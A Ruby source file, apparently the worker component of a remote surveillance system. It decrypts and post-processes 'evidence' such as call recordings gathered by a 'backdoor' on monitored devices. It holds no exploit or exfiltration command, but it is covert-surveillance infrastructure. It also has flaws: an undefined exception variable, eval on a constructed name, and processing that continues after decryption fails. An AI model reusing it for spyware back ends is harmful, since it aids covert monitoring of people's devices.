#
# The main file of the worker
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'
require 'rcs-common/evidence_manager'

# from RCS::Audio
require 'rcs-worker/audio_processor'
require 'rcs-worker/evidence/call'

# form System
require 'digest/md5'
require 'optparse'

module RCS
module Worker

class Worker
  include Tracer
  
  attr_reader :type
  
  def initialize(db_file, type)
    
    # db file where evidence to be processed are stored
    @instance = db_file
    
    # type of evidences to be processed
    @type = type

    @audio_processor = AudioProcessor.new

    trace :info, "Working on evidence stored in #{@instance}, type #{@type.to_s}."
    
  end
  
  def get_key()
    
  end
  
  def process
    require 'pp'
    
    info = RCS::EvidenceManager.instance.instance_info(@instance)
    trace :info, "Processing backdoor #{info['build']}:#{info['instance']}"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    trace :debug, "Evidence key #{info['key']}"
    evidence_key = Digest::MD5.digest info['key']
    
    evidence_sizes = RCS::EvidenceManager.instance.evidence_info(@instance)
    evidence_ids = RCS::EvidenceManager.instance.evidence_ids(@instance)
    trace :info, "Pieces of evidence to be processed: #{evidence_ids.join(', ')}."
    
    evidence_ids.each do |id|
      binary = RCS::EvidenceManager.instance.get_evidence(id, @instance)
      trace :info, "Processing evidence #{id}: #{binary.size} bytes."
      
      # deserialize evidence
      begin
        evidence = RCS::Evidence.new(evidence_key).deserialize(binary)
      rescue EvidenceDeserializeError
        trace :fatal, "FAILURE: " << e.to_s
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      rescue Exception => e
        trace :fatal, "FAILURE: " << e.to_s
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end

      puts evidence.type
      
      # postprocess evidence
      begin
        mod = "#{evidence.type.to_s.capitalize}PostProcessing"
        evidence.extend eval mod if RCS.const_defined? mod.to_sym
        evidence.postprocess if evidence.respond_to? :postprocess
      rescue Exception => e
        trace :fatal, "FAILURE: " << e.to_s
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end
    end
    
    trace :info, "All evidence has been processed."
  end
end

class Application
  include RCS::Tracer
  
  # To change this template use File | Settings | File Templates.
  def run(options, file)
    
    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml' then
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end
    
    # ensure the log directory is present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
    
    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end
    
    begin
      version = File.read(Dir.pwd + '/config/version.txt')
      trace :info, "Starting a RCS Worker #{version}..."
      w = RCS::Worker::Worker.new(File.basename(file), options[:type])
      w.process
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.to_s
      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      return 1
    end
    
    return 0
  end
  
  # we instantiate here an object and run it
  def self.run!(*argv)
    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}
    
    optparse = OptionParser.new do |opts|
      # Set a banner, displayed at the top of the help screen.
      opts.banner = "Usage: rcs-worker [options] <database file>"
        
      # Default is to process ALL types of evidence, otherwise explicit the one you want parsed
      options[:type] = :ALL
      opts.on( '-t', '--type TYPE', [:ALL, :DEVICE, :CALL], 'Process only evidences of type TYPE' ) do |type|
        options[:type] = type
      end
      
      # This displays the help screen, all programs are assumed to have this option.
      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        exit
      end
    end
    
    optparse.parse!
    
    return Application.new.run(options, ARGV.shift)
  end
end

end # Worker::
end # RCS::